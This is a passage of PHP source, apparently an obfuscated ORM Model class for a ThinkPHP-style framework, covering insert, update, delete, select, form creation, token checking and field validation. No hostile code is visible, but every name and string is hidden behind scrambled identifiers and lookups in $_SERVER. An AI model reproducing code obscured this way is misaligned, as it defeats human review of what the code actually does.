(empty($Ìé«÷Ûº)) { if (!empty($this->data)) { $Ìé«÷Ûº = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[å¸¿•¶£][271]); return !1; } } $¶Ö¤ËÔÕ = $this->_parseOptions($¶Ö¤ËÔÕ); $Ìé«÷Ûº = $this->_facade($Ìé«÷Ûº); if (!1 === $this->_beforeInsert($Ìé«÷Ûº, $¶Ö¤ËÔÕ)) { return !1; } $„‡…ì÷ = $this->db->insert($Ìé«÷Ûº, $¶Ö¤ËÔÕ, $…¥Åõî«); if (!1 !== $„‡…ì÷) { $Âï»¦§Í = $this->getLastInsID(); if ($Âï»¦§Í) { $Ìé«÷Ûº[$this->getPk()] = $Âï»¦§Í; $this->_after_insert($Ìé«÷Ûº, $¶Ö¤ËÔÕ); return $Âï»¦§Í; } $this->_after_insert($Ìé«÷Ûº, $¶Ö¤ËÔÕ); } return $„‡…ì÷; } protected function _beforeInsert(&$†î–õ²Ÿ, $ĞÃ„©’) { } protected function _after_insert($è³Ç§œ—, $íªñ‡ºÔ) { } public function addAll($ıù‚„Û, $Î®Ù³‡± = array(), $Âï—· = false) { $§¶Šğ¼¾ =& $_SERVER[å¸¿•¶£]; if (empty($ıù‚„Û)) { $this->error = think_lang($§¶Šğ¼¾[271]); return !1; } $Î®Ù³‡± = $this->_parseOptions($Î®Ù³‡±); foreach ($ıù‚„Û as $„ïé°ƒ¾ => $–ÊËÂ») { $ıù‚„Û[$„ïé°ƒ¾] = $this->_facade($–ÊËÂ»); } if (method_exists($this->db, $§¶Šğ¼¾[272])) { $†òá÷Æ‘ = $this->db->insertAll($ıù‚„Û, $Î®Ù³‡±, $Âï—·); } else { $this->startTrans(); foreach ($ıù‚„Û as $„ïé°ƒ¾ => $–ÊËÂ») { $†òá÷Æ‘ = $this->db->insert($–ÊËÂ», $Î®Ù³‡±, $Âï—·); } $this->commit(); } if (!1 !== $†òá÷Æ‘) { $¢¡àùÜ¯ = $this->getLastInsID(); if ($¢¡àùÜ¯) { return $¢¡àùÜ¯; } } return $†òá÷Æ‘; } public function selectAdd($„ŞãëÃ± = '', $ËÄè¬º = '', $Óª×øÎè = array()) { $’ÄÈÊÀÜ =& $_SERVER[å¸¿•¶£]; $Óª×øÎè = $this->_parseOptions($Óª×øÎè); if (!1 === ($˜¡ÓŒ³Š = $this->db->selectInsert($„ŞãëÃ± ? $„ŞãëÃ± : $Óª×øÎè[$’ÄÈÊÀÜ[273]], $ËÄè¬º ? $ËÄè¬º : $this->getTableName(), $Óª×øÎè))) { $this->error = think_lang($’ÄÈÊÀÜ[274]); return !1; } else { return $˜¡ÓŒ³Š; } } public function save($ÚšÉ¥ØÉ = '', $ÑÕ¥çô² = array()) { $öÍ¨ºåç =& $_SERVER[å¸¿•¶£]; if (empty($ÚšÉ¥ØÉ)) { if (!empty($this->data)) { $ÚšÉ¥ØÉ = $this->data; $this->data = array(); } else { $this->error = think_lang($öÍ¨ºåç[271]); return !1; } } $ÚšÉ¥ØÉ = $this->_facade($ÚšÉ¥ØÉ); $ÑÕ¥çô² = $this->_parseOptions($ÑÕ¥çô²); $îú‘ÜÀ• = $this->getPk(); if (!isset($ÑÕ¥çô²[$öÍ¨ºåç[275]])) { if (isset($ÚšÉ¥ØÉ[$îú‘ÜÀ•])) { $ö‹ŞÒÈœ[$îú‘ÜÀ•] = $ÚšÉ¥ØÉ[$îú‘ÜÀ•]; $ÑÕ¥çô²[$öÍ¨ºåç[275]] = $ö‹ŞÒÈœ; unset($ÚšÉ¥ØÉ[$îú‘ÜÀ•]); } else { $this->error = think_lang($öÍ¨ºåç[274]); return !1; } } if (is_array($ÑÕ¥çô²[$öÍ¨ºåç[275]]) && isset($ÑÕ¥çô²[$öÍ¨ºåç[275]][$îú‘ÜÀ•])) { $ÆÒæ…€Š = $ÑÕ¥çô²[$öÍ¨ºåç[275]][$îú‘ÜÀ•]; } if (!1 === $this->_beforeUpdate($ÚšÉ¥ØÉ, $ÑÕ¥çô²)) { return !1; } $Ø½ÊĞİ = $this->db->update($ÚšÉ¥ØÉ, $ÑÕ¥çô²); if (!1 !== $Ø½ÊĞİ) { if (isset($ÆÒæ…€Š)) { $ÚšÉ¥ØÉ[$îú‘ÜÀ•] = $ÆÒæ…€Š; } $this->_afterUpdate($ÚšÉ¥ØÉ, $ÑÕ¥çô²); } return $Ø½ÊĞİ; } protected function _beforeUpdate(&$‡’ıƒ½©, $›ÄÑ¿Ó–) { } protected function _afterUpdate($ÍïÜÙèû, $Ô¶ûÑÓ) { } public function delete($ÌÍ™Š¡© = array()) { $èÄ¬ öÚ =& $_SERVER[å¸¿•¶£]; if (empty($ÌÍ™Š¡©) && empty($this->options[$èÄ¬ öÚ[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Ñ”ĞÌçÎ = $this->getPk(); if (is_numeric($ÌÍ™Š¡©) || is_string($ÌÍ™Š¡©)) { if (strpos($ÌÍ™Š¡©, $èÄ¬ öÚ[50])) { $éÂüŠç[$Ñ”ĞÌçÎ] = array($èÄ¬ öÚ[276], $ÌÍ™Š¡©); } else { $éÂüŠç[$Ñ”ĞÌçÎ] = $ÌÍ™Š¡©; } $this->options[$èÄ¬ öÚ[275]] = $éÂüŠç; } $ÌÍ™Š¡© = $this->_parseOptions(); if (is_array($ÌÍ™Š¡©[$èÄ¬ öÚ[275]]) && isset($ÌÍ™Š¡©[$èÄ¬ öÚ[275]][$Ñ”ĞÌçÎ])) { $‹Äü»àî = $ÌÍ™Š¡©[$èÄ¬ öÚ[275]][$Ñ”ĞÌçÎ]; } $Öğ«§´¬ = $this->db->delete($ÌÍ™Š¡©); if (!1 !== $Öğ«§´¬) { $¹èÕã¢ë = array(); if (isset($‹Äü»àî)) { $¹èÕã¢ë[$Ñ”ĞÌçÎ] = $‹Äü»àî; } $this->_after_delete($¹èÕã¢ë, $ÌÍ™Š¡©); } return $Öğ«§´¬; } protected function _after_delete($«·¸œûß, $ ßşä¨—) { } public function select($‰åŸİí– = array()) { $ø£³ ¾ç =& $_SERVER[å¸¿•¶£]; if (is_string($‰åŸİí–) || is_numeric($‰åŸİí–)) { $©ç‘€À = $this->getPk(); if (strpos($‰åŸİí–, $ø£³ ¾ç[50])) { $Àöñùµ[$©ç‘€À] = array($ø£³ ¾ç[276], $‰åŸİí–); } else { $Àöñùµ[$©ç‘€À] = $‰åŸİí–; } $this->options[$ø£³ ¾ç[275]] = $Àöñùµ; } elseif (!1 === $‰åŸİí–) { $‰åŸİí– = $this->_parseOptions(); return $ø£³ ¾ç[277] . $this->db->buildSelectSql($‰åŸİí–) . $ø£³ ¾ç[278]; } $‰åŸİí– = $this->_parseOptions(); $ü £’£Ş = $this->db->select($‰åŸİí–); if (!1 === $ü £’£Ş) { return !1; } if (empty($ü £’£Ş)) { return null; } $this->_afterSelect($ü £’£Ş, $‰åŸİí–); return $ü £’£Ş; } protected function _afterSelect(&$Í•›™ô™, $¥ õãÌ) { } public function buildSql($óÅ£ñ§ = array()) { $¾¦î¼™Ğ =& $_SERVER[å¸¿•¶£]; $óÅ£ñ§ = $this->_parseOptions($óÅ£ñ§); return $¾¦î¼™Ğ[277] . $this->db->buildSelectSql($óÅ£ñ§) . $¾¦î¼™Ğ[278]; } public function optionsValue($ú°ı® = null) { if (is_null($ú°ı®)) { return $this->options; } elseif (is_array($ú°ı®)) { $this->options = array_merge($this->options, $ú°ı®); } } protected function _parseOptions($ÖİÊÀäí = array()) { $¶‚ÜÃÏ˜ =& $_SERVER[å¸¿•¶£]; if (is_array($ÖİÊÀäí)) { $ÖİÊÀäí = array_merge($this->options, $ÖİÊÀäí); } $this->options = array(); if (!isset($ÖİÊÀäí[$¶‚ÜÃÏ˜[279]])) { $ÖİÊÀäí[$¶‚ÜÃÏ˜[279]] = $this->getTableName(); $¬«¼Ğ¿¾ = $this->fields; } else { $¬«¼Ğ¿¾ = $this->getDbFields(); } if (!empty($ÖİÊÀäí[$¶‚ÜÃÏ˜[280]])) { $ÖİÊÀäí[$¶‚ÜÃÏ˜[279]] .= $¶‚ÜÃÏ˜[53] . $ÖİÊÀäí[$¶‚ÜÃÏ˜[280]]; } $ÖİÊÀäí[$¶‚ÜÃÏ˜[281]] = $this->name; if (isset($ÖİÊÀäí[$¶‚ÜÃÏ˜[275]]) && is_array($ÖİÊÀäí[$¶‚ÜÃÏ˜[275]]) && !empty($¬«¼Ğ¿¾) && !isset($ÖİÊÀäí[$¶‚ÜÃÏ˜[282]]) && !isset($ÖİÊÀäí[$¶‚ÜÃÏ˜[279]])) { foreach ($ÖİÊÀäí[$¶‚ÜÃÏ˜[275]] as $Ä‡ µ¥µ => $¿òÖ“–·) { $Ä‡ µ¥µ = trim($Ä‡ µ¥µ); if (in_array($Ä‡ µ¥µ, $¬«¼Ğ¿¾, !0)) { if (is_scalar($¿òÖ“–·)) { $this->_parseType($ÖİÊÀäí[$¶‚ÜÃÏ˜[275]], $Ä‡ µ¥µ); } } elseif (!is_numeric($Ä‡ µ¥µ) && $¶‚ÜÃÏ˜[11] != substr($Ä‡ µ¥µ, 0, 1) && !1 === strpos($Ä‡ µ¥µ, $¶‚ÜÃÏ˜[10]) && !1 === strpos($Ä‡ µ¥µ, $¶‚ÜÃÏ˜[260]) && !1 === strpos($Ä‡ µ¥µ, $¶‚ÜÃÏ˜[283]) && !1 === strpos($Ä‡ µ¥µ, $¶‚ÜÃÏ˜[284])) { unset($ÖİÊÀäí[$¶‚ÜÃÏ˜[275]][$Ä‡ µ¥µ]); } } } $this->_options_filter($ÖİÊÀäí); return $ÖİÊÀäí; } protected function _options_filter(&$¢ÌÉ¯÷Ç) { } protected function _parseType(&$ÂŸê¤¼€, $òªà‚¡á) { $úŠšË€Ì =& $_SERVER[å¸¿•¶£]; if (empty($this->options[$úŠšË€Ì[285]][$úŠšË€Ì[4] . $òªà‚¡á])) { $³ÊÛ¡ê¡ = strtolower($this->fields[$úŠšË€Ì[252]][$òªà‚¡á]); if (!1 !== strpos($³ÊÛ¡ê¡, $úŠšË€Ì[286])) { } elseif (!1 === strpos($³ÊÛ¡ê¡, $úŠšË€Ì[287]) && !1 !== strpos($³ÊÛ¡ê¡, $úŠšË€Ì[288])) { $ÂŸê¤¼€[$òªà‚¡á] = intval($ÂŸê¤¼€[$òªà‚¡á]); } elseif (!1 !== strpos($³ÊÛ¡ê¡, $úŠšË€Ì[289]) || !1 !== strpos($³ÊÛ¡ê¡, $úŠšË€Ì[290])) { $ÂŸê¤¼€[$òªà‚¡á] = floatval($ÂŸê¤¼€[$òªà‚¡á]); } elseif (!1 !== strpos($³ÊÛ¡ê¡, $úŠšË€Ì[291])) { $ÂŸê¤¼€[$òªà‚¡á] = (bool) $ÂŸê¤¼€[$òªà‚¡á]; } } } public function find($¶×µ“á¥ = array()) { $§ç›ú¬¶ =& $_SERVER[å¸¿•¶£]; if (is_numeric($¶×µ“á¥) || is_string($¶×µ“á¥)) { $òåºÎÉ»[$this->getPk()] = intval($¶×µ“á¥); $this->options[$§ç›ú¬¶[275]] = $òåºÎÉ»; } $this->options[$§ç›ú¬¶[292]] = 1; $¶×µ“á¥ = $this->_parseOptions(); $³ŒÎßğÕ = $this->db->select($¶×µ“á¥); if (!1 === $³ŒÎßğÕ) { return !1; } if (empty($³ŒÎßğÕ)) { return null; } $this->data = $³ŒÎßğÕ[0]; $this->_afterFind($this->data, $¶×µ“á¥); if (!empty($this->options[$§ç›ú¬¶[293]])) { return $this->returnResult($this->data, $this->options[$§ç›ú¬¶[293]]); } return $this->data; } protected function _afterFind(&$´…æ¹†, $íıÃÌ²) { } protected function returnResult($æ“ºœîÛ, $ŞëÍÛÀ” = '') { $Ğ¯¬í°œ =& $_SERVER[å¸¿•¶£]; if ($ŞëÍÛÀ”) { if (is_callable($ŞëÍÛÀ”)) { return call_user_func($ŞëÍÛÀ”, $æ“ºœîÛ); } switch (strtolower($ŞëÍÛÀ”)) { case $Ğ¯¬í°œ[294]: return json_encode($æ“ºœîÛ); case $Ğ¯¬í°œ[295]: return xml_encode($æ“ºœîÛ); } } return $æ“ºœîÛ; } public function parseFieldsMap($™ºÍœå, $÷â¿·²¤ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $‘‘ˆ€´µ => $îø¿›Ç£) { if ($÷â¿·²¤ == 1) { if (isset($™ºÍœå[$îø¿›Ç£])) { $™ºÍœå[$‘‘ˆ€´µ] = $™ºÍœå[$îø¿›Ç£]; unset($™ºÍœå[$îø¿›Ç£]); } } else { if (isset($™ºÍœå[$‘‘ˆ€´µ])) { $™ºÍœå[$îø¿›Ç£] = $™ºÍœå[$‘‘ˆ€´µ]; unset($™ºÍœå[$‘‘ˆ€´µ]); } } } } return $™ºÍœå; } public function setField($”šÁ€ÂÁ, $Ô°º×”” = '') { if (is_array($”šÁ€ÂÁ)) { $š†Ôà‘ª = $”šÁ€ÂÁ; } else { $š†Ôà‘ª[$”šÁ€ÂÁ] = $Ô°º×””; } return $this->save($š†Ôà‘ª); } public function setAdd($ıáËÉ‘×, $¥Ú‡šÈ± = 1) { $¹²»ÎõÛ =& $_SERVER[å¸¿•¶£]; $Ñë•¶ú® = $ıáËÉ‘× . $¹²»ÎõÛ[296] . $¥Ú‡šÈ±; if ($¥Ú‡šÈ± < 0) { $Ñë•¶ú® = $ıáËÉ‘× . $¥Ú‡šÈ±; } return $this->setField($ıáËÉ‘×, array($¹²»ÎõÛ[297], $Ñë•¶ú®)); } public function getField($“´…óÇ, $Ô´¯ïÈ‰ = null) { $æ™¼Ê¤„ =& $_SERVER[å¸¿•¶£]; $šüˆé×[$æ™¼Ê¤„[273]] = $“´…óÇ; $šüˆé× = $this->_parseOptions($šüˆé×); $“´…óÇ = trim($“´…óÇ); if (strpos($“´…óÇ, $æ™¼Ê¤„[50])) { if (!isset($šüˆé×[$æ™¼Ê¤„[292]])) { $šüˆé×[$æ™¼Ê¤„[292]] = is_numeric($Ô´¯ïÈ‰) ? $Ô´¯ïÈ‰ : $æ™¼Ê¤„[12]; } $¬÷ßÊ†• = $this->db->select($šüˆé×); if (!empty($¬÷ßÊ†•)) { $÷÷÷ïŸş = explode($æ™¼Ê¤„[50], $“´…óÇ); $“´…óÇ = array_keys($¬÷ßÊ†•[0]); $ú¯¸Ê‘ = array_shift($“´…óÇ); $ß„‘àˆ = array_shift($“´…óÇ); $èÈõÔéÈ = array(); $Ãº•ì¬š = count($÷÷÷ïŸş); foreach ($¬÷ßÊ†• as $ô§“ Î˜) { $Áç¡”æï = $ô§“ Î˜[$ú¯¸Ê‘]; if (2 == $Ãº•ì¬š) { $èÈõÔéÈ[$Áç¡”æï] = $ô§“ Î˜[$ß„‘àˆ]; } else { $èÈõÔéÈ[$Áç¡”æï] = is_string($Ô´¯ïÈ‰) ? implode($Ô´¯ïÈ‰, $ô§“ Î˜) : $ô§“ Î˜; } } return $èÈõÔéÈ; } } else { if (!0 !== $Ô´¯ïÈ‰) { $šüˆé×[$æ™¼Ê¤„[292]] = is_numeric($Ô´¯ïÈ‰) ? $Ô´¯ïÈ‰ : 1; } if ($Ô´¯ïÈ‰ === $æ™¼Ê¤„[255]) { unset($šüˆé×[$æ™¼Ê¤„[292]]); } $ô§“ Î˜ = $this->db->select($šüˆé×); if (!empty($ô§“ Î˜)) { if ($Ô´¯ïÈ‰ === $æ™¼Ê¤„[255]) { return reset($ô§“ Î˜[0]); } if (!0 !== $Ô´¯ïÈ‰ && 1 == $šüˆé×[$æ™¼Ê¤„[292]]) { return reset($ô§“ Î˜[0]); } foreach ($ô§“ Î˜ as $Û«³üŞ) { $’˜’×İÄ[] = $Û«³üŞ[$“´…óÇ]; } return $’˜’×İÄ; } } return null; } public function create($•ğœÙâğ = '', $óÄ‹‰¨¡ = '') { $‡²ÔˆôÜ =& $_SERVER[å¸¿•¶£]; if (empty($•ğœÙâğ)) { $•ğœÙâğ = $_POST; } elseif (is_object($•ğœÙâğ)) { $•ğœÙâğ = get_object_vars($•ğœÙâğ); } if (empty($•ğœÙâğ) || !is_array($•ğœÙâğ)) { $this->error = think_lang($‡²ÔˆôÜ[271]); return !1; } $•ğœÙâğ = $this->parseFieldsMap($•ğœÙâğ, 0); $óÄ‹‰¨¡ = $óÄ‹‰¨¡ ? $óÄ‹‰¨¡ : (!empty($•ğœÙâğ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$‡²ÔˆôÜ[273]])) { $£›¡— = $this->options[$‡²ÔˆôÜ[273]]; unset($this->options[$‡²ÔˆôÜ[273]]); } elseif ($óÄ‹‰¨¡ == THINK_MODEL_INSERT && isset($this->insertFields)) { $£›¡— = $this->insertFields; } elseif ($óÄ‹‰¨¡ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $£›¡— = $this->updateFields; } if (isset($£›¡—)) { if (is_string($£›¡—)) { $£›¡— = explode($‡²ÔˆôÜ[50], $£›¡—); } if (think_config($‡²ÔˆôÜ[298])) { $£›¡—[] = think_config($‡²ÔˆôÜ[299]); } foreach ($•ğœÙâğ as $ìÀû¦ï” => $İÇóÆ˜‚) { if (!in_array($ìÀû¦ï”, $£›¡—)) { unset($•ğœÙâğ[$ìÀû¦ï”]); } } } if (!$this->autoValidation($•ğœÙâğ, $óÄ‹‰¨¡)) { return !1; } if (!$this->autoCheckToken($•ğœÙâğ)) { $this->error = think_lang($‡²ÔˆôÜ[300]); return !1; } if ($this->autoCheckFields) { $£›¡— = $this->getDbFields(); foreach ($•ğœÙâğ as $ìÀû¦ï” => $İÇóÆ˜‚) { if (!in_array($ìÀû¦ï”, $£›¡—)) { unset($•ğœÙâğ[$ìÀû¦ï”]); } elseif (MAGIC_QUOTES_GPC && is_string($İÇóÆ˜‚)) { $•ğœÙâğ[$ìÀû¦ï”] = stripslashes($İÇóÆ˜‚); } } } $this->autoOperation($•ğœÙâğ, $óÄ‹‰¨¡); $this->data = $•ğœÙâğ; return $•ğœÙâğ; } public function autoCheckToken($øÇîè) { $ãâÄÍãÎ =& $_SERVER[å¸¿•¶£]; if (isset($this->options[$ãâÄÍãÎ[301]]) && !$this->options[$ãâÄÍãÎ[301]]) { return !0; } if (think_config($ãâÄÍãÎ[298])) { $…ÙÏ´äó = think_config($ãâÄÍãÎ[299]); if (!isset($øÇîè[$…ÙÏ´äó]) || Session::get($…ÙÏ´äó)) { return !1; } list($¾®ÅÕ , $‰¡×Ù†) = explode($ãâÄÍãÎ[11], $øÇîè[$…ÙÏ´äó]); if ($‰¡×Ù† && Session::get($…ÙÏ´äó . $ãâÄÍãÎ[10] . $¾®ÅÕ ) === $‰¡×Ù†) { Session::remove($…ÙÏ´äó . $ãâÄÍãÎ[10] . $¾®ÅÕ ); return !0; } if (think_config($ãâÄÍãÎ[302])) { Session::remove($…ÙÏ´äó . $ãâÄÍãÎ[10] . $¾®ÅÕ ); } return !1; } return !0; } public function regex($Ù¦Â‰Ã›, $ôôş˜Şƒ) { $ÇÛ³¬ì– =& $_SERVER[å¸¿•¶£]; $ŒÍáÃ³û = array($ÇÛ³¬ì–[303] => $ÇÛ³¬ì–[304], $ÇÛ³¬ì–[305] => $ÇÛ³¬ì–[306], $ÇÛ³¬ì–[307] => $ÇÛ³¬ì–[308], $ÇÛ³¬ì–[309] => $ÇÛ³¬ì–[310], $ÇÛ³¬ì–[311] => $ÇÛ³¬ì–[312], $ÇÛ³¬ì–[313] => $ÇÛ³¬ì–[314], $ÇÛ³¬ì–[315] => $ÇÛ³¬ì–[316], $ÇÛ³¬ì–[290] => $ÇÛ³¬ì–[317], $ÇÛ³¬ì–[318] => $ÇÛ³¬ì–[319]); if (isset($ŒÍáÃ³û[strtolower($ôôş˜Şƒ)])) { $ôôş˜Şƒ = $ŒÍáÃ³û[strtolower($ôôş˜Şƒ)]; } return preg_match($ôôş˜Şƒ, $Ù¦Â‰Ã›) === 1; } private function autoOperation(&$ë®Î¼‹ , $¯ë±äú) { $íüÈ¦¬® =& $_SERVER[å¸¿•¶£]; if (!empty($this->options[$íüÈ¦¬®[320]])) { $ÉÆ¶Ç«Ã = $this->options[$íüÈ¦¬®[320]]; unset($this->options[$íüÈ¦¬®[320]]); } elseif (!empty($this->_auto)) { $ÉÆ¶Ç«Ã = $this->_auto; } if (isset($ÉÆ¶Ç«Ã)) { foreach ($ÉÆ¶Ç«Ã as $•Œ©¿ü›) { if (empty($•Œ©¿ü›[2])) { $•Œ©¿ü›[2] = THINK_MODEL_INSERT; } if ($¯ë±äú == $•Œ©¿ü›[2] || $•Œ©¿ü›[2] == THINK_MODEL_BOTH) { switch (trim($•Œ©¿ü›[3])) { case $íüÈ¦¬®[321]: case $íüÈ¦¬®[322]: $¾è»…à° = isset($•Œ©¿ü›[4]) ? (array) $•Œ©¿ü›[4] : array(); if (isset($ë®Î¼‹ [$•Œ©¿ü›[0]])) { array_unshift($¾è»…à°, $ë®Î¼‹ [$•Œ©¿ü›[0]]); } if ($íüÈ¦¬®[321] == $•Œ©¿ü›[3]) { $ë®Î¼‹ [$•Œ©¿ü›[0]] = call_user_func_array($•Œ©¿ü›[1], $¾è»…à°); } else { $ë®Î¼‹ [$•Œ©¿ü›[0]] = call_user_func_array(array(&$this, $•Œ©¿ü›[1]), $¾è»…à°); } break; case $íüÈ¦¬®[273]: $ë®Î¼‹ [$•Œ©¿ü›[0]] = $ë®Î¼‹ [$•Œ©¿ü›[1]]; break; case $íüÈ¦¬®[323]: if ($íüÈ¦¬®[12] === $ë®Î¼‹ [$•Œ©¿ü›[0]]) { unset($ë®Î¼‹ [$•Œ©¿ü›[0]]); } break; case $íüÈ¦¬®[324]: default: $ë®Î¼‹ [$•Œ©¿ü›[0]] = $•Œ©¿ü›[1]; } if (!1 === $ë®Î¼‹ [$•Œ©¿ü›[0]]) { unset($ë®Î¼‹ [$•Œ©¿ü›[0]]); } } } } return $ë®Î¼‹ ; } protected function autoValidation($ú«ÏìÒ£, $‹”³Ò) { $ÍÏßúìÁ =& $_SERVER[å¸¿•¶£]; if (!empty($this->options[$ÍÏßúìÁ[325]])) { $°Šáß¬¢ = $this->options[$ÍÏßúìÁ[325]]; unset($this->options[$ÍÏßúìÁ[325]]); } elseif (!empty($this->_validate)) { $°Šáß¬¢ = $this->_validate; } if (isset($°Šáß¬¢)) { if ($this->patchValidate) { $this->error = array(); } foreach ($°Šáß¬¢ as $òÜª£å‘ => $î¿¶Ÿæö) { if (empty($î¿¶Ÿæö[5]) || $î¿¶Ÿæö[5] == THINK_MODEL_BOTH || $î¿¶Ÿæö[5] == $‹”³Ò) { if (0 == strpos($î¿¶Ÿæö[2], $ÍÏßúìÁ[326]) && strpos($î¿¶Ÿæö[2], $ÍÏßúìÁ[327])) { $î¿¶Ÿæö[2] = think_lang(substr($î¿¶Ÿæö[2], 2, -1)); } $î¿¶Ÿæö[3] = isset($î¿¶Ÿæö[3]) ? $î¿¶Ÿæö[3] : THINK_EXISTS_VALIDATE; $î¿¶Ÿæö[4] = isset($î¿¶Ÿæö[4]) ? $î¿¶Ÿæö[4] : $ÍÏßúìÁ[328]; switch ($î¿¶Ÿæö[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ú«ÏìÒ£, $î¿¶Ÿæö)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ÍÏßúìÁ[12] != trim($ú«ÏìÒ£[$î¿¶Ÿæö[0]])) { if (!1 === $this->_validationField($ú«ÏìÒ£, $î¿¶Ÿæö)) { return !1; } } break; default: if (isset($ú«ÏìÒ£[$î¿¶Ÿæö[0]])) { if (!1 === $this->_validationField($ú«ÏìÒ£, $î¿¶Ÿæö)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($××¼öÕ, $¤éûÅ) { if (!1 === $this->_validationFieldItem($××¼öÕ, $¤éûÅ)) { if ($this->patchValidate) { $this->error[$¤éûÅ[0]] = $¤éûÅ[2]; } else { $this->error = $¤éûÅ[2]; return !1; } } return; } protected function _validationFieldItem($Ù¼¨¡”Ç, $µœæĞÚ) { $É…Ëıïú =& $_SERVER[å¸¿•¶£]; switch (strtolower(trim($µœæĞÚ[4]))) { case $É…Ëıïú[321]: case $É…Ëıïú[322]: $¯¶ş©¥ = isset($µœæĞÚ[6]) ? (array) $µœæĞÚ[6] : array(); if (is_string($µœæĞÚ[0]) && strpos($µœæĞÚ[0], $É…Ëıïú[50])) { $µœæĞÚ[0] = explode($É…Ëıïú[50], $µœæĞÚ[0]); } if (is_array($µœæĞÚ[0])) { foreach ($µœæĞÚ[0] as $î³Í‰¾Š) { $şÇóû ª[$î³Í‰¾Š] = $Ù¼¨¡”Ç[$î³Í‰¾Š]; } array_unshift($¯¶ş©¥, $şÇóû ª); } else { array_unshift($¯¶ş©¥, $Ù¼¨¡”Ç[$µœæĞÚ[0]]); } if ($É…Ëıïú[321] == $µœæĞÚ[4]) { return call_user_func_array($µœæĞÚ[1], $¯¶ş©¥); } else { return call_user_func_array(array(&$this, $µœæĞÚ[1]), $¯¶ş©¥); } case $É…Ëıïú[329]: return $Ù¼¨¡”Ç[$µœæĞÚ[0]] == $Ù¼¨¡”Ç[$µœæĞÚ[1]]; case $É…Ëıïú[330]: if (is_string($µœæĞÚ[0]) && strpos($µœæĞÚ[0], $É…Ëıïú[50])) { $µœæĞÚ[0] = explode($É…Ëıïú[50], $µœæĞÚ[0]); } $èáèîÆ = array(); if (is_array($µœæĞÚ[0])) { foreach ($µœæĞÚ[0] as $î³Í‰¾Š) { $èáèîÆ[$î³Í‰¾Š] = $Ù¼¨¡”Ç[$î³Í‰¾Š]; } } else { $èáèîÆ[$µœæĞÚ[0]] = $Ù¼¨¡”Ç[$µœæĞÚ[0]]; } if (!empty($Ù¼¨¡”Ç[$this->getPk()])) { $èáèîÆ[$this->getPk()] = array($É…Ëıïú[331], $Ù¼¨¡”Ç[$this->getPk()]); } if ($this->where($èáèîÆ)->find()) { return !1; } return !0; default: return $this->check($Ù¼¨¡”Ç[$µœæĞÚ[0]], $µœæĞÚ[1], $µœæĞÚ[4]); } } public function check($„‹¸ãêë, $èô¤ß°À, $»Ğ‚±Ïµ = "\x72\x65\147\145\x78") { $„‚¤ÎŒ¸ =& $_SERVER[å¸¿•¶£]; $»Ğ‚±Ïµ = strtolower(trim($»Ğ‚±Ïµ)); switch ($»Ğ‚±Ïµ) { case $„‚¤ÎŒ¸[7]: case $„‚¤ÎŒ¸[332]: $Ö½¶Œ®ù = is_array($èô¤ß°À) ? $èô¤ß°À : explode($„‚¤ÎŒ¸[50], $èô¤ß°À); return $»Ğ‚±Ïµ == $„‚¤ÎŒ¸[7] ? in_array($„‹¸ãêë, $Ö½¶Œ®ù) : !in_array($„‹¸ãêë, $Ö½¶Œ®ù); case $„‚¤ÎŒ¸[333]: case $„‚¤ÎŒ¸[334]: if (is_array($èô¤ß°À)) { $’è“¹ë’ = $èô¤ß°À[0]; $¡ÕÑ¤ğó = $èô¤ß°À[1]; } else { list($’è“¹ë’, $¡ÕÑ¤ğó) = explode($„‚¤ÎŒ¸[50], $èô¤ß°À); } return $»Ğ‚±Ïµ == $„‚¤ÎŒ¸[333] ? $„‹¸ãêë >= $’è“¹ë’ && $„‹¸ãêë <= $¡ÕÑ¤ğó : $„‹¸ãêë < $’è“¹ë’ || $„‹¸ãêë > $¡ÕÑ¤ğó; case $„‚¤ÎŒ¸[335]: case $„‚¤ÎŒ¸[336]: return $»Ğ‚±Ïµ == $„‚¤ÎŒ¸[335] ? $„‹¸ãêë == $èô¤ß°À : $„‹¸ãêë != $èô¤ß°À; case $„‚¤ÎŒ¸[337]: $´Şë¼³ = mb_strlen($„‹¸ãêë, $„‚¤ÎŒ¸[338]); if (strpos($èô¤ß°À, $„‚¤ÎŒ¸[50])) { list($’è“¹ë’, $¡ÕÑ¤ğó) = explode($„‚¤ÎŒ¸[50], $èô¤ß°À); return $´Şë¼³ >= $’è“¹ë’ && $´Şë¼³ <= $¡ÕÑ¤ğó; } else { return $´Şë¼³ == $èô¤ß°À; } case $„‚¤ÎŒ¸[339]: list($Æ•Õç°º, $êÔü²æ) = explode($„‚¤ÎŒ¸[50], $èô¤ß°À); if (!is_numeric($Æ•Õç°º)) { $Æ•Õç°º = strtotime($Æ•Õç°º); } if (!is_numeric($êÔü²æ)) { $êÔü²æ = strtotime($êÔü²æ); } return NOW_TIME >= $Æ•Õç°º && NOW_TIME <= $êÔü²æ; case $„‚¤ÎŒ¸[340]: return in_array(get_client_ip(), explode($„‚¤ÎŒ¸[50], $èô¤ß°À)); case $„‚¤ÎŒ¸[341]: return !in_array(get_client_ip(), explode($„‚¤ÎŒ¸[50], $èô¤ß°À)); case $„‚¤ÎŒ¸[328]: default: return $this->regex($„‹¸ãêë, $èô¤ß°À); } } public function query($œÕµœŠ, $ºï£è”× = false) { $ïØ†•Ì¶ =& $_SERVER[å¸¿•¶£]; if (!is_bool($ºï£è”×) && !is_array($ºï£è”×)) { $ºï£è”× = func_get_args(); array_shift($ºï£è”×); } $œÕµœŠ = str_replace(array($ïØ†•Ì¶[231], $ïØ†•Ì¶[342]), $ïØ†•Ì¶[53], $œÕµœŠ); $œÕµœŠ = $this->parseSql($œÕµœŠ, $ºï£è”×); return $this->db->query($œÕµœŠ); } public function execute($™´Êœ€Ì, $×¢°‡’” = false) { if (!is_bool($×¢°‡’”) && !is_array($×¢°‡’”)) { $×¢°‡’” = func_get_args(); array_shift($×¢°‡’”); } $™´Êœ€Ì = $this->parseSql($™´Êœ€Ì, $×¢°‡’”); return $this->db->execute($™´Êœ€Ì); } protected function parseSql($ñÚŒÏœã, $‘Ìò“Û) { $ò‰ñçœ» =& $_SERVER[å¸¿•¶£]; if (!0 === $‘Ìò“Û) { 